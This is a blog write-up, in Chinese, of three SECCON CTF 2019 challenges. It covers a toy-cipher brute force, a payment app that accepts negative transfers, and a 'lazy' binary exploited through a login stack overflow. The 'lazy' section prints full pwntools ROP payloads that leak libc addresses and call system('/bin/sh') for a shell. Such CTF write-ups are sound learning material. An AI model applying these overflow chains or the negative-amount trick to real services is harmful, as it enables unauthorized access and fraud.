---
layout: post
title:  "SECCON CTF 2019-Writeup"
date:   2019-10-21
desc: ""
keywords: ""
categories: [Ctf]
tags: [CTF]
icon: icon-html
---

# SECCON CTF 2019-Writeup

Running tql

## coffee_break

```python
import sys
from Crypto.Cipher import AES
import base64

def encrypt(key, text):
    s = ''
    for i in range(len(text)):
        s += chr((((ord(text[i]) - 0x20) + (ord(key[i % len(key)]) - 0x20)) % (0x7e - 0x20 + 1)) + 0x20)
    return s

def encrypt(key, text):
    s = ''
    for i in range(len(text)):
        s += chr((((ord(text[i]) - 0x20) + (ord(key[i % len(key)]) - 0x20)) % (0x7e - 0x20 + 1)) + 0x20)
    return s


key1 = "SECCON"
key2 = "seccon2019"
text = sys.argv[1]

enc1 = encrypt(key1, text)

cipher = AES.new(key2 + chr(0x00) * (16 - (len(key2) % 16)), AES.MODE_ECB)
p = 16 - (len(enc1) % 16)
enc2 = cipher.encrypt(enc1 + chr(p) * p)
print(base64.b64encode(enc2).decode('ascii'))
```

key白给，aes直接解，enc1爆破

```python
import sys
from Crypto.Cipher import AES
import base64

import string
def encrypt(key, text):
    s = ''
    for i in range(len(text)):
        s += chr((((ord(text[i]) - 0x20) + (ord(key[i % len(key)]) - 0x20)) % (0x7e - 0x20 + 1)) + 0x20)
    return s

def encrypt(key, text):
    s = ''
    for i in range(len(text)):
        s += chr((((ord(text[i]) - 0x20) + (ord(key[i % len(key)]) - 0x20)) % (0x7e - 0x20 + 1)) + 0x20)
    return s

key1 = "SECCON"
key2 = "seccon2019"
text = sys.argv[1]
enc1 = encrypt(key1, text)

cipher = AES.new(key2 + chr(0x00) * (16 - (len(key2) % 16)), AES.MODE_ECB)
p = 16 - (len(enc1) % 16)
enc2 = cipher.encrypt(enc1 + chr(p) * p)
print(base64.b64encode(enc2).decode('ascii'))

enc = 'FyRyZNBO2MG6ncd3hEkC/yeYKUseI/CxYoZiIeV2fe/Jmtwx+WbWmU1gtMX9m905'

print(cipher.decrypt(base64.b64decode(enc)).encode('hex'))

enc1 = '276a66667e7c4f7839273334473923673532463f3438393e42257c293137337e2925382e276a66667e7c51'
chars = string.printable
flag = ''
key = "SECCON"
for i in range(len(enc1.decode('hex'))):
    for j in chars:
        if enc1.decode('hex')[i] == chr((((ord(j) - 0x20) + (ord(key[i % len(key)]) - 0x20)) % (0x7e - 0x20 + 1)) + 0x20):
            flag += j
            break
print(flag)

```



## ZKPay

每个账号初始500块，生成二维码给其他账号打钱，扫码收钱

二维码解码内容如下

```
username=aidai&amount=500&proof=MJFPi+KmhuQdJ945Td6b4gSuUxbH535aogkELbMGBmwHMSAwgp2rjxmJwg9UV3xbJ557HVpvmvX+nPM8xqYYFy8KSgwwCjCFxAPYaYNeRN6BJP3M4bcSNo1FKAjsQmqRYnTE8JsqGVB3Lkl19Ot3Vs8HC7j2cvxx+ksfqvzcEJifdiUdApUDMSAwxuNX5DTk3yca7ScdcY6twI9wpjvHC3cT0BsE8su1iyowCjBL5FCsQkmtrmpJ29agjzIQpFfaz98As3GRwiPIcYEiATAgMInx2FmsiF3u/by2HT4fw3T7COc9xcxLC8+zh2tK1ywoMQowYKNhogFBKNXWtw8CpDtGjVX/9WPFbLEk1iqK+Ns2KgwxCjC2ux3m75pHgWOD9xhztUNk6Ts16Q1Iu2/aVMcamSNLCTEK&hash=27a40f8ac1e48263ffa5cacbe6ab0f10e83d714d9dd4766404ff64bc7049f2f4
```

打钱数变化proof和hash不变，猜测只会验证钱是否够用

非预期解：测试发现可以打负数，果断开俩号恰烂钱

![1](D:\Ai\GitHub\images\seccon2019\1.jpg)

![2](D:\Ai\GitHub\images\seccon2019\2.jpg)

预期解应该是伪造proof，等一波wp





## lazy

开局一nc，没文件，先打过去

```
1: Public contents
2: Login
3: Exit
1
Welcome to public directory
You can download contents in this directory
diary_4.txt
diary_3.txt
diary_1.txt
login_source.c
diary_2.txt
```

读一波文件

```
./diary_4.txt
Sending 77 bytesStop blogging because there was unauthorized access to the server. Farewell.

./diary_3.txt
Sending 141 bytesThird

Tired. Its also been a month since last post.
There is nothing to tell. OK, I will release the source code.
This is login func.

Bye.

./diary_1.txt
Sending 308 bytesMy First Post!

Welcome! This is my first blog and first post!
I will write about tech, especially Cyber Security!

As first step, I made file transfer service with C.
This server has login func, public transfer func and private transfer func.

I worked hard today. Very very sleepy...
See you in next post!

./diary_2.txt
Sending 274 bytesSecond Post

Hey guys! It's me, oh, I haven't told you my name yet.
My name is _H4CK3R_ ! I want to be a HACKER!

In this weeks, I worked hard in my office, so, very tired.
I can't study cybersecurity because I want to go to bed, anyway.

I will do my best...tommorow. Bye.
```

login.c

```c
./login_source.c
Sending 1201 bytes
#define BUFFER_LENGTH 32
#define PASSWORD "XXXXXXXXXX"
#define USERNAME "XXXXXXXX"
//_H4CK3R_
//3XPL01717
int login(void){
        char username[BUFFER_LENGTH];
        char password[BUFFER_LENGTH];
        char input_username[BUFFER_LENGTH];
        char input_password[BUFFER_LENGTH];

        memset(username,0x0,BUFFER_LENGTH);
        memset(password,0x0,BUFFER_LENGTH);
        memset(input_username,0x0,BUFFER_LENGTH);
        memset(input_password,0x0,BUFFER_LENGTH);

        strcpy(username,USERNAME);
        strcpy(password,PASSWORD);

        printf("username : ");
        input(input_username);
        printf("Welcome, %s\n",input_username);

        printf("password : ");
        input(input_password);


        if(strncmp(username,input_username,strlen(USERNAME)) != 0){
                puts("Invalid username");
                return 0;
        }

        if(strncmp(password,input_password,strlen(PASSWORD)) != 0){
                puts("Invalid password");
                return 0;
        }

        return 1;
}


void input(char *buf){
        int recv;
        int i = 0;
        while(1){
                recv = (int)read(STDIN_FILENO,&buf[i],1);
                if(recv == -1){
                        puts("ERROR!");
                        exit(-1);
                }
                if(buf[i] == '\n'){
                        return;
                }
                i++;
        }
}

```

登陆处存在溢出，用户名和密码在栈上，可以打出来，看diary也可以发现用户名为\_H4CK3R\_

```python
r.sendline('2')
r.sendline('_H4CK3R_')
r.sendline('3XPL01717')
```

成功登陆

```
password : Logged in!
1: Public contents
2: Login
3: Exit
4: Manage
$ 4
Welcome to private directory
You can download contents in this directory, but you can't download contents with a dot in the name
lazy
libc.so.6
Input file name
$  
```

登陆后多了个4，进4可以下载更多文件

```python
r.sendline('4')
r.sendline('lazy')
r.recvuntil('bytes')
a = r.recvall()
log.info(a)
f = open('lazy','w')
f.write(a)
```

libc.so.6无法下载，先下载lazy，checksec发现开了canary，但是在username溢出时没有影响

现在已经可以控制程序流程，如何获得libc

LibcSearcher，libcdatabase没用，必须在程序中下载

很白给，但是记录一下走的弯路

![3](D:\Ai\GitHub\images\seccon2019\3.jpg)

跳过chdir，直接到call listing，可以打一波文件名，但是无法下载

```python
r.sendline('2')
payload = '_H4CK3R__H4CK3R__H4CK3R_'
payload =  payload.ljust(0x68,'a')+p64(0x401517)+p64(0x40104E)
r.sendline(payload)
r.sendline('3XPL01717')
r.interactive()
```

```
run.sh
lazy
ld.so
cat
.profile
libc.so.6
810a0afb2c69f8864ee65f0bdca999d7_FLAG
.bashrc
q
.bash_logout
```

看到flag了，不考虑libc，尝试直接读flag

调read把flag文件名写到0x602000，然后调用open打开flag，跳到public中call open下方

有pop rdi ret和pop rsi pop r15 ret，没rdx，但是问题不大

测试发现因为flag文件名过长，read完选2直接崩

可以输入libc.so.6，但是并不能下载



继续尝试下载libc

![4](D:\Ai\GitHub\images\seccon2019\4.jpg)

chdir可控，private中下载限制较多，如果我在public中得到private目录的下载权限，就可以下载libc

利用pop rdi和已有的./q/private字符串，执行chdir("./q/private")，然后跳到call chdir下方，成功打印出private，但是输入文件名就崩，必须从0x4014c9开始执行才能下载，但是如果从这里开始执行就无法控制目录



睡了俩小时突然想到为什么不直接调用download

读flag是不可能的，read完不能继续溢出。

读libc，文件中有libc.so.6字符串，尝试直接用，发现报 ./libc.so 没有这个文件

问题不大，我调read写个libc.so.6

```python
r.sendline('2')

payload = '_H4CK3R__H4CK3R__H4CK3R_'
payload =  payload.ljust(0x68,'a')+p64(pop_rdi)+p64(0)+p64(pop_rsi_15)+p64(0x602000)+p64(0)+p64(read_plt)+p64(pop_rdi)+p64(0x602000)+p64(puts_plt)+p64(0x40104E)
r.sendline(payload)
r.sendline('3XPL01717')
r.sendline('libc.so.6')

sleep(1)

r.sendline('2')
payload = '_H4CK3R__H4CK3R__H4CK3R_'
payload =  payload.ljust(0x68,'a')+p64(pop_rdi)+p64(0x602000)+p64(0x40153B)
r.sendline(payload)
r.sendline('3XPL01717')

r.recvuntil('bytes')
f = open('libc','w')
f.write(r.recvall())
```

sleep()那块卡了我一波，如果没有sleep会崩，我以为不可行，在sleep处r.interactive()看了一下发现是可行的

拿到libc之后这题就没了，泄露地址算偏移read写/bin/sh跳system就完事了

```python
r.sendline('2')
payload = '_H4CK3R__H4CK3R__H4CK3R_'
payload =  payload.ljust(0x68,'a')+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(0x40104E)
r.sendline(payload)
r.sendline('3XPL01717')
r.recvuntil('password : Invalid username\n')

puts = u64(r.recvuntil('\n1:',drop=True).ljust(8,'\x00'))
log.info(puts)
log.success('puts:'+hex(puts))

puts_libc = 0x67880
libc_base = puts - puts_libc
system = libc_base+0x3f570

r.sendline('2')

payload = '_H4CK3R__H4CK3R__H4CK3R_'
payload =  payload.ljust(0x68,'a')+p64(pop_rdi)+p64(0)+p64(pop_rsi_15)+p64(0x602000)+p64(0)+p64(read_plt)+p64(pop_rdi)+p64(0x602000)+p64(puts_plt)+p64(0x40104E)

r.sendline(payload)
r.sendline('3XPL01717')
r.sendline('/bin/sh')

sleep(1)
r.sendline('2')
payload = '_H4CK3R__H4CK3R__H4CK3R_'
payload =  payload.ljust(0x68,'a')+p64(pop_rdi)+p64(0x602000)+p64(system)

r.sendline(payload)

r.interactive()
```

```
Invalid username
$ ls
810a0afb2c69f8864ee65f0bdca999d7_FLAG
cat
lazy
ld.so
libc.so.6
q
run.sh
$ ./cat 810a0afb2c69f8864ee65f0bdca999d7_FLAG
SECCON{Keep_Going!_KEEP_GOING!_K33P_G01NG!}
```



